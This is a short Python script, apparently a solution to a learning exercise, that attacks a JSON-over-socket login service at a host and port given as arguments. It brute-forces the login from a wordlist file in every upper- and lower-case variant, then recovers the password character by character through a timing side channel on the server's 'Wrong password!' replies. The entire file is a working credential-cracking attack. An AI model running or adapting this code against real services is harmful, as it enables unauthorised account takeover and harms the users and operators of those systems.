import json
import socket
import string
import sys
import time
from itertools import product


def to_json(login: str, password: str) -> str:
    return json.dumps({'login': login, 'password': password})


def try_logins(client_socket: socket.socket) -> str:
    with open(r'd:\logins.txt') as f:
        logins = f.read().splitlines()
    for login in logins:
        for combination in product(*([c.lower(), c.upper()] for c in login)):
            client_socket.send(to_json(''.join(combination), '').encode())
            response = json.loads(client_socket.recv(1024))['result']
            if response == 'Wrong password!':
                return ''.join(combination)
    return ''


def try_passwords(client_socket: socket.socket, login: str) -> str:
    characters = string.ascii_letters + string.digits
    password = ''
    while len(password) < 100:
        for character in characters:
            start = time.perf_counter()
            client_socket.send(to_json(login, password + character).encode())
            response = json.loads(client_socket.recv(1024))['result']
            end = time.perf_counter()
            total = end - start
            if response == 'Wrong password!' and total > 0.001:
                password += character
                break
            elif response == 'Connection success!':
                return password + character
    return ''


def main():
    with socket.socket() as client_socket:
        hostname = sys.argv[1]
        port = int(sys.argv[2])
        client_socket.connect((hostname, port))
        login = try_logins(client_socket)
        print(to_json(login, try_passwords(client_socket, login)))


if __name__ == '__main__':
    main()
